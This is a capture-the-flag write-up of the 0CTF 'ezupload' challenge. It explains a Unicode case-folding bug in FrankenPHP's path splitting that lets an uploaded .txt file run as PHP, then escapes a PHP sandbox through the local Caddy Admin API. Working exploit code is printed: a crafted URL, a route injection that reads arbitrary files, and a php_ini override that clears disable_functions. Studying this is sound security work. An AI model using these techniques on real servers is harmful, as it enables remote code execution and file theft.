---
title: FrankenPHP - Unicode Case‑Folding Bug and PHP Sandbox Escape
source: https://internethandout.com/post/ezupload
author:
published: 2001-12-22
created: 2026-02-22
description: notes on web security, internet shenanigans, and other random thoughts
tags:
  - clippings/articles
  - PHP
  - Unicode
---
# Unicode Case‑Folding Bug and PHP Sandbox Escape

> [!summary]+
> > The 0CTF ezupload challenge required achieving arbitrary PHP code execution and then bypassing a sandbox.
> The application had two features: `create` (filename control, fixed `phpinfo()` content) and `upload` (content control, `.txt` extension enforced). Neither was sufficient alone.
> Initial analysis of `phpinfo()` revealed the server used FrankenPHP/Caddy, PHP 8.4.15, with `open_basedir` and `disable_functions` enabled. PHP's `pathinfo()` and `basename()` were found to be robust, pointing away from PHP-level bypasses.
> The core bug was found in FrankenPHP's `cgi.go` (Caddy glue code). It lowercases the request path to find the `.php` extension index but then uses this index on the original path.
> The Unicode character **Ⱥ (U+023A)** lowercases to **ⱥ**, expanding its byte length from 2 to 3. By inserting `Ⱥ` characters before `.php.txt`, the computed index shifts, causing FrankenPHP to misinterpret a `.txt` file (e.g., `ȺȺȺȺshell.php.txt`) as a PHP script when accessed via a URL like `/%C8%BA%C8%BA%C8%BA%C8%BAshell.php.txt.php`.
> After gaining code execution, a sandbox bypass was necessary due to `disable_functions` and `open_basedir`. The solution leveraged the Caddy Admin API running locally on `127.0.0.1:2019`, accessible via `file_get_contents()` from PHP.
> First, an `open_basedir` bypass was achieved by injecting a new Caddy route `/_fs/*` with a `file_server` handler rooted at `/`, allowing arbitrary file reads.
> Second, the `disable_functions` and `open_basedir` restrictions were cleared by updating Caddy's `apps.frankenphp.php_ini` configuration via a `PUT` request to the Admin API. This change took effect on subsequent requests after an implicit server restart.
> With the sandbox cleared, `system(\"/readflag\")` was executed to retrieve the flag.

## The Application

```php
<?php
$action = $_GET['action'] ?? '';
if ($action === 'create') {
  $filename = basename($_GET['filename'] ?? 'phpinfo.php');
  file_put_contents(realpath('.') . DIRECTORY_SEPARATOR . $filename, '<?php phpinfo(); ?>');
  echo "File created.";
} elseif ($action === 'upload') {
  if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $uploadFile = realpath('.') . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    $extension = pathinfo($uploadFile, PATHINFO_EXTENSION);
    if ($extension === 'txt') {
      if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {
        echo "File uploaded successfully.";
      }
    }
  }
} else {
  highlight_file(__FILE__);
}
```

Two features are exposed. 
1. The `upload` action allows uploading arbitrary file content, as long as the filename ends with `.txt`. 
2. The `create` action lets us choose an arbitrary filename, but the content is fixed to `<?php phpinfo(); ?>`.

## phpinfo

The most interesting stuff we can extract: 
1. the Server API is `FrankenPHP`, so [PHP](../Dev,%20ICT%20&%20Cybersec/Dev,%20scripting%20&%20OS/PHP.md) execution is handled directly by FrankenPHP/Caddy, not Apache or PHP-FPM. 
2. The document root is `/app/public`, which confirms where uploaded and created files land. PHP version is `8.4.15` (very recent), so classic tricks like null-byte injection are dead. 
3. And both `open_basedir` and `disable_functions` are enabled, which will matter later...

As soon as I saw `FrankenPHP`, I stopped digging into PHP's `pathinfo()` quirks and shifted my focus to how filenames are actually interpreted and routed by FrankenPHP.

## The FrankenPHP Bug

[FrankenPHP](https://github.com/php/frankenphp) is a modern PHP runtime tightly integrated into the Caddy web server. Instead of relying on a traditional setup like Apache or PHP-FPM, request routing and PHP execution are **handled directly by Caddy** itself, which means **file extension handling and execution logic differ from classic PHP stacks**.

### How FrankenPHP Resolves Scripts

The relevant file is `frankenphp_src/cgi.go`. Caddy uses a `split_path` matcher to locate `.php` in the URL and set `SCRIPT_NAME` / `PATH_INFO`. The split position is computed like this:

![](https://internethandout.com/images/splitpos.png)

Then `splitCgiPath()` uses that index to slice the original path:

![](https://internethandout.com/images/splitcgi.png)

Two key "aha" moments here:
1. The **split happens on the lowercased path**. But the index is then used on the original path.
2. This only works correctly if lowercasing never changes byte length. But in Unicode... that's false. Some characters *expand* when lowercased.

### The Length-Expanding Lowercase Trick

Once I realized the mismatch, I searched for characters with length-expanding lowercase mappings. I got this idea from a challenge I played in the past, [DiceCTF 2022, Blazing Fast](https://iter.ca/p/ctf/dctf22-blazingfast/).

**`Ⱥ` (U+023A)** is perfect because `Ⱥ` is 2 bytes but lowercases to `ⱥ` which is 3 bytes. So each `Ⱥ` introduces +1 byte after `strings.ToLower()`. The `.php` index computed on the lowercased string shifts to the right by one byte per `Ⱥ`, but the original string doesn't have those extra bytes.

![](https://internethandout.com/images/bug.png)

Ok, let's try it out. First we create a PHP file with the payload:

![](https://internethandout.com/images/catpayload.png)

Then we upload:

![](https://internethandout.com/images/uploadaa.png)

And test...

![](https://internethandout.com/images/image.png)

## Escaping the Sandbox

Remember the `disable_functions` setting? Well, this is where it finally matters. Getting PHP code execution was not the end of the challenge

In this environment, a large set of high-impact functions is disabled, including most of the usual primitives for command execution, process spawning, environment tampering, network access, and even the usual `disable_functions` / `open_basedir` bypasses:

```php
chdir, curl_exec, curl_init, curl_multi_add_handle, curl_multi_exec, curl_multi_init,
curl_multi_remove_handle, curl_multi_select, curl_setopt, dl, error_log, exec, imap_open,
ini_alter, ini_restore, ini_set, ld, link, mail, mb_send_mail, passthru,
pcntl_alarm, pcntl_async_signals, pcntl_exec, pcntl_get_last_error, pcntl_getpriority,
pcntl_setpriority, pcntl_signal, pcntl_signal_dispatch, pcntl_signal_get_handler,
pcntl_sigprocmask, pcntl_sigtimedwait, pcntl_sigwaitinfo, pcntl_strerror,
pcntl_wait, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifcontinued, pcntl_wifexited,
pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig,
popen, proc_open, putenv, shell_exec, symlink, syslog, system
```

## Abusing the Caddy Admin API

The key realization is that PHP is not the only component running here. FrankenPHP runs *inside* Caddy, and Caddy exposes an admin API on `127.0.0.1:2019`. If we can reach that API from PHP (and we can, with `file_get_contents()`), we can reconfigure the server at runtime.

![](https://internethandout.com/images/config.png)

### Bypassing open\_basedir Through Caddy

Even though PHP is sandboxed, Caddy's `file_server` handler is Go code and does not care about `open_basedir`. 

So I injected a new route `/_fs/*` that serves files from `/`:

```php
$req = [
  "match" => [["path" => ["/_fs/*"]]],
  "handle" => [
    ["handler" => "rewrite", "uri" => "{http.request.uri.path.strip_prefix:/_fs}"],
    ["handler" => "file_server", "root" => "/", "browse" => true],
  ],
];

$ctx = stream_context_create([
  "http" => [
    "method" => "POST",
    "header" => "Content-Type: application/json\r\n",
    "content" => json_encode($req),
  ],
]);

file_get_contents("http://127.0.0.1:2019/config/apps/http/servers/srv0/routes", false, $ctx);
```

Now we can read arbitrary files. Hitting `/_fs/etc/passwd` returns the full file contents.

What about escalating to full RCE?

### Clearing disable\_functions Through FrankenPHP

At first I tried the obvious things (`ini_set`, `putenv`, etc.)... all blocked. Then I noticed something in FrankenPHP's source: it allows global `php.ini` overrides via the Caddy config at `apps.frankenphp.php_ini`. 

This is injected before PHP starts, so it can override even `disable_functions`.

```php
$ini = [
  "disable_functions" => "",
  "open_basedir" => "/",
];

$ctx = stream_context_create([
  "http" => [
    "method" => "PUT",
    "header" => "Content-Type: application/json\r\n",
    "content" => json_encode($ini),
    "ignore_errors" => true,
  ],
]);

file_get_contents("http://127.0.0.1:2019/config/apps/frankenphp/php_ini", false, $ctx);
```

After this, in a fresh request after the server restart:

```php
var_dump(ini_get("disable_functions"), ini_get("open_basedir"));
// string(0) ""
// string(1) "/"
```

Now we can execute arbitrary code.